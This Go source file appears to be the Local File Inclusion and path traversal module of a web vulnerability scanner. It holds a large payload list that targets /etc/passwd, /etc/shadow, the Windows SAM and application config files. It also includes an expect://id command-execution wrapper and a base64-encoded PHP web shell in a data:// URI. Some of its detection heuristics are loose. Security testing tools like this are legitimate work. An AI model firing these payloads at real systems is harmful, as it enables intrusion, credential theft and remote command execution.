package scanner

import (
	"context"
	"fmt"
	"regexp"
	"strings"

	"github.com/GhostN3xus/Huntsuite/pkg/logging"
)

// LFI Scanner - Local File Inclusion & Path Traversal Detection
// This module performs REAL validation by checking for actual file content patterns

// Common file signatures for LFI validation
var lfiSignatures = map[string][]string{
	"/etc/passwd": {
		"root:x:0:0:",
		"root:.*:0:0:",
		"bin:.*:1:1:",
		"daemon:.*:2:2:",
		"/bin/bash",
		"/bin/sh",
		"nobody:x:",
	},
	"/etc/hosts": {
		"127.0.0.1",
		"localhost",
		"::1",
	},
	"/etc/group": {
		"root:x:0:",
		"daemon:x:",
		"bin:x:",
	},
	"/etc/shadow": {
		"root:\\$",
		":\\$1\\$",
		":\\$6\\$",
	},
	"win.ini": {
		"[fonts]",
		"[extensions]",
		"[files]",
		"for 16-bit app support",
	},
	"boot.ini": {
		"[boot loader]",
		"[operating systems]",
		"multi\\(0\\)",
	},
	"/proc/self/environ": {
		"PATH=",
		"HOME=",
		"USER=",
	},
	"/var/log/apache2/access.log": {
		"GET /",
		"POST /",
		"HTTP/1.",
		"Mozilla/",
	},
	"web.config": {
		"<configuration>",
		"<system.web>",
		"<appSettings>",
	},
}

// LFI payloads for different operating systems and bypass techniques
func getLFIPayloads() []string {
	return []string{
		// Linux - Direct paths
		"/etc/passwd",
		"/etc/shadow",
		"/etc/hosts",
		"/etc/group",
		"/etc/issue",
		"/etc/hostname",
		"/proc/self/environ",
		"/proc/self/cmdline",
		"/proc/version",

		// Linux - Relative path traversal
		"../etc/passwd",
		"../../etc/passwd",
		"../../../etc/passwd",
		"../../../../etc/passwd",
		"../../../../../etc/passwd",
		"../../../../../../etc/passwd",
		"../../../../../../../etc/passwd",
		"../../../../../../../../etc/passwd",

		// Linux - Encoded traversal
		"..%2Fetc%2Fpasswd",
		"..%2F..%2Fetc%2Fpasswd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"..%252Fetc%252Fpasswd",

		// Linux - Double encoding
		"..%252F..%252Fetc%252Fpasswd",
		"..%c0%af..%c0%afetc%c0%afpasswd",

		// Linux - Null byte injection (for older systems)
		"/etc/passwd%00",
		"../../../etc/passwd%00",
		"/etc/passwd%00.jpg",

		// Linux - With common prefixes
		"../../../../etc/passwd",
		"..\\..\\..\\..\\etc\\passwd",

		// Windows - Direct paths
		"C:\\Windows\\System32\\drivers\\etc\\hosts",
		"C:\\Windows\\win.ini",
		"C:\\boot.ini",
		"C:\\Windows\\System.ini",
		"C:\\Windows\\system32\\config\\sam",

		// Windows - Relative traversal
		"..\\..\\..\\..\\Windows\\win.ini",
		"..\\..\\..\\..\\..\\Windows\\win.ini",
		"..\\..\\..\\..\\..\\..\\Windows\\win.ini",

		// Windows - Forward slash
		"../../../../Windows/win.ini",
		"../../../../../Windows/win.ini",

		// Windows - Encoded
		"..%5C..%5C..%5CWindows%5Cwin.ini",
		"..%2F..%2F..%2FWindows%2Fwin.ini",

		// Web application files
		"../../../var/www/html/index.php",
		"../../index.php",
		"../../../config.php",
		"../../wp-config.php",
		"../../../application/config/database.php",

		// Log files
		"/var/log/apache2/access.log",
		"/var/log/apache2/error.log",
		"/var/log/nginx/access.log",
		"/var/log/nginx/error.log",
		"../../../../../../../var/log/apache2/access.log",

		// PHP wrappers (for advanced exploitation)
		"php://filter/convert.base64-encode/resource=/etc/passwd",
		"php://filter/read=string.rot13/resource=/etc/passwd",
		"expect://id",
		"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",

		// Java paths
		"../../../../../../etc/passwd",
		"..\\..\\..\\..\\..\\..\\etc\\passwd",
		"WEB-INF/web.xml",
		"WEB-INF/classes/application.properties",

		// Python paths
		"../../../../../../etc/passwd",
		"../../../settings.py",
		"../../../config.py",

		// Dotdotpwn style
		".\\.\\.\\.\\.\\.\\.\\.\\.\\etc\\passwd",
		"./././././././etc/passwd",

		// Unicode encoding
		"..%c0%af..%c0%afetc%c0%afpasswd",
		"..%e0%80%afetc%e0%80%afpasswd",
	}
}

// scanLFI performs Local File Inclusion scanning with REAL validation
func (e *Engine) scanLFI(ctx context.Context, target string, points []injectionPoint, opts Options) error {
	if !opts.EnableLFI {
		return nil
	}

	e.logger.Info("starting LFI/Path Traversal scan", logging.Fields{
		"target": target,
		"points": len(points),
	})

	payloads := getLFIPayloads()

	for _, point := range points {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		for _, payload := range payloads {
			select {
			case <-ctx.Done():
				return ctx.Err()
			default:
			}

			// Create request with payload
			req := point.templateForValue(payload)

			// Send request and get response
			resp, err := e.executeRequest(ctx, req, opts)
			if err != nil {
				continue
			}

			// Perform REAL validation
			if e.validateLFI(payload, resp) {
				// We found a REAL LFI vulnerability!
				finding := Finding{
					Title:       "Local File Inclusion Vulnerability",
					Type:        "LFI",
					Severity:    SeverityHigh,
					Description: fmt.Sprintf("Local File Inclusion vulnerability detected in %s. The application reads and returns the content of arbitrary files from the server.", point.label()),
					Evidence:    fmt.Sprintf("Payload: %s\nResponse contained file signatures indicating successful file read.", payload),
					PoC: fmt.Sprintf("curl -X %s '%s'\n\nThe response contains recognizable patterns from system files, confirming the vulnerability.",
						req.Method, req.URL),
				}

				e.reportFinding(ctx, finding, point, req, resp)

				e.logger.Warn("LFI vulnerability found", logging.Fields{
					"severity": string(finding.Severity),
					"type":     finding.Type,
					"target":   req.URL,
					"evidence": truncateString(finding.Evidence, 100),
				})

				// Don't test more payloads for this point once we found a vulnerability
				break
			}
		}
	}

	e.logger.Info("LFI scan completed", logging.Fields{"target": target})
	return nil
}

// validateLFI performs REAL validation by checking for actual file content patterns
func (e *Engine) validateLFI(payload string, resp responsePayload) bool {
	if resp.StatusCode != 200 {
		// Most LFI vulnerabilities return 200 OK
		return false
	}

	body := string(resp.Body)
	bodyLower := strings.ToLower(body)

	// Determine which file we're trying to read
	targetFile := extractTargetFile(payload)

	// Check for specific file signatures
	if signatures, exists := lfiSignatures[targetFile]; exists {
		for _, sig := range signatures {
			// Use regex for flexible matching
			matched, _ := regexp.MatchString(sig, body)
			if matched {
				e.logger.Debug("LFI signature matched", logging.Fields{
					"file":      targetFile,
					"signature": sig,
					"payload":   payload,
				})
				return true
			}
		}
	}

	// Generic validation - check for common patterns that indicate file read
	lfiPatterns := []string{
		// Unix passwd patterns
		`root:.*:0:0:`,
		`bin:.*:1:1:`,
		`daemon:.*:2:2:`,
		`/bin/bash`,
		`/bin/sh`,
		`/sbin/nologin`,

		// Windows patterns
		`\[fonts\]`,
		`\[extensions\]`,
		`\[boot loader\]`,
		`\[operating systems\]`,
		`multi\(0\)`,

		// Web config patterns
		`<configuration>`,
		`<system\.web>`,
		`<connectionStrings>`,

		// Log file patterns
		`GET /.*HTTP/1\.`,
		`POST /.*HTTP/1\.`,
		`User-Agent:.*Mozilla`,

		// PHP code patterns
		`<\?php`,
		`\$_GET`,
		`\$_POST`,
		`include\(`,
		`require\(`,

		// Environment variables
		`PATH=/`,
		`HOME=/`,
		`USER=`,
		`SHELL=/`,
	}

	for _, pattern := range lfiPatterns {
		matched, _ := regexp.MatchString(pattern, body)
		if matched {
			e.logger.Debug("generic LFI pattern matched", logging.Fields{
				"pattern": pattern,
				"payload": payload,
			})
			return true
		}
	}

	// Check for directory listing indicators
	if strings.Contains(bodyLower, "index of") ||
		strings.Contains(bodyLower, "parent directory") ||
		strings.Contains(bodyLower, "[dir]") {
		return true
	}

	// Check response length - legitimate file reads usually have substantial content
	// But error messages are typically short
	if len(body) > 1000 && !strings.Contains(bodyLower, "error") &&
		!strings.Contains(bodyLower, "not found") {
		// Additional heuristic: check if content looks like a system file
		if strings.Count(body, "\n") > 10 || strings.Count(body, ":") > 10 {
			return true
		}
	}

	return false
}

// extractTargetFile extracts the target filename from a payload
func extractTargetFile(payload string) string {
	// Remove traversal sequences
	cleaned := strings.ReplaceAll(payload, "../", "")
	cleaned = strings.ReplaceAll(cleaned, "..\\", "")
	cleaned = strings.ReplaceAll(cleaned, "..%2F", "")
	cleaned = strings.ReplaceAll(cleaned, "..%5C", "")
	cleaned = strings.ReplaceAll(cleaned, "..%252F", "")

	// Remove null bytes
	cleaned = strings.Split(cleaned, "%00")[0]

	// Extract common file patterns
	if strings.Contains(cleaned, "/etc/passwd") {
		return "/etc/passwd"
	}
	if strings.Contains(cleaned, "/etc/shadow") {
		return "/etc/shadow"
	}
	if strings.Contains(cleaned, "/etc/hosts") {
		return "/etc/hosts"
	}
	if strings.Contains(cleaned, "/etc/group") {
		return "/etc/group"
	}
	if strings.Contains(cleaned, "win.ini") {
		return "win.ini"
	}
	if strings.Contains(cleaned, "boot.ini") {
		return "boot.ini"
	}
	if strings.Contains(cleaned, "environ") {
		return "/proc/self/environ"
	}
	if strings.Contains(cleaned, "access.log") {
		return "/var/log/apache2/access.log"
	}
	if strings.Contains(cleaned, "web.config") {
		return "web.config"
	}

	return cleaned
}
